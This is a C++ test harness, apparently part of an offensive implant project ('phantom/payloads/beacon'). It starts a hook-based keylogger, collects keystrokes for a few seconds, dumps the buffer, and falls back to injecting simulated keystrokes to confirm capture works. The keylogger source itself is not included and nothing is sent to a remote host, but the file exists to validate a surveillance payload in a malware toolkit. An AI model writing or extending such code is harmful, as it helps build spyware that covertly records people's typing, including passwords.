// Minimal test: compile & run the hook-based keylogger in isolation
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <cstdio>

// Include the keylogger header directly
#include "../phantom/payloads/beacon/src/keylogger.h"

int main() {
    printf("[*] Starting keylogger hook test...\n");
    
    std::string r = keylogger::start();
    printf("  start: %s\n", r.c_str());
    
    if (r.find("FAILED") != std::string::npos) {
        printf("[FAIL] Keylogger failed to start\n");
        return 1;
    }
    
    printf("[*] Keylogger running! Type some keys, then press Enter to dump...\n");
    printf("[*] (Timer: 5 seconds)\n");
    
    // Wait 5 seconds for keystrokes
    for (int i = 5; i > 0; i--) {
        printf("  %d...\n", i);
        Sleep(1000);
    }
    
    std::string dump = keylogger::dump();
    printf("  dump result: %s\n", dump.c_str());
    
    std::string stop = keylogger::stop();
    printf("  stop: %s\n", stop.c_str());
    
    if (dump.find("Buffer is empty") == std::string::npos) {
        printf("[PASS] Keylogger captured keystrokes!\n");
    } else {
        // Try one more time with simulated input
        printf("[*] Retrying with simulated keystrokes...\n");
        
        r = keylogger::start();
        printf("  start: %s\n", r.c_str());
        
        // Simulate some keys
        for (const char* p = "Test123"; *p; p++) {
            SHORT vk = VkKeyScanA(*p);
            keybd_event(vk & 0xFF, 0, 0, 0);
            Sleep(30);
            keybd_event(vk & 0xFF, 0, KEYEVENTF_KEYUP, 0);
            Sleep(30);
        }
        keybd_event(VK_RETURN, 0, 0, 0);
        Sleep(30);
        keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
        Sleep(500);
        
        dump = keylogger::dump();
        printf("  dump: %s\n", dump.c_str());
        
        stop = keylogger::stop();
        printf("  stop: %s\n", stop.c_str());
        
        if (dump.find("Buffer is empty") == std::string::npos) {
            printf("[PASS] Keylogger captured simulated keystrokes!\n");
        } else {
            printf("[FAIL] Keylogger captured nothing\n");
        }
    }
    
    return 0;
}
